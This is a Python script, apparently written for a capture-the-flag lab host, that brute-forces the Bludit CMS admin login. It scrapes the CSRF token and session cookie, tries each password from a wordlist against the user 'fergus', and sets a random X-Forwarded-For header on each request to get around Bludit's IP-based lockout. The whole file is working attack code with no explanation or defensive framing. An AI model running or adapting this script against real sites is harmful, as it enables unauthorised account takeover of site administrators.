import requests
import sys
import random
import re

HOST= '10.10.10.191'
USER= 'fergus'
PROXY = { 'http': 'http://127.0.0.1:8080'}

def init_session():
    # Return CSRF + session cookie
    r = requests.get(f'http://{HOST}/admin/')
    csrf =  re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-f0-9]*)"', r.text)
    csrf = csrf.group(1)
    cookie = r.cookies.get('BLUDIT-KEY')
    return csrf, cookie

def login(user,password):
    #tokenCSRF=1942a1691ee18bad659af18428e95dd2ce26a437&username=admin&password=admin&save=
    csrf, cookie = init_session()
    headers = {
            'X-FORWARDED-FOR': f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
            }
    data = {
            'tokenCSRF':csrf,
            'username': user,
            'password': password,
            'save':'' }
    cookies = {
            'BLUDIT-KEY': cookie
            }
    #r = requests.post(f'http://{HOST}/admin/login', data=data, cookies=cookies, proxies=PROXY, headers=headers, allow_redirects=False)
    r = requests.post(f'http://{HOST}/admin/login', data=data, cookies=cookies, headers=headers, allow_redirects=False)
    # Username or password incorrect
    if r.status_code != 200:
        print(f'\n{USER}:{password}')
        #print('CSRF ERROR')
        return True
    elif "password incorrect" in r.text:
        return False
    elif "has been blocked" in r.text:
        print("BLOCKED!")
        return False
    else:
        print(f'{USER}:{password}')
        return True

#print( init_session() )
login_number = 0
wl = open('words').readlines()
for line in wl:
    line = line.strip()
    login_number = login_number + 1
    sys.stdout.write(f'\rLogin Attempt: {login_number}')
    if login( USER, line) == True:
        break
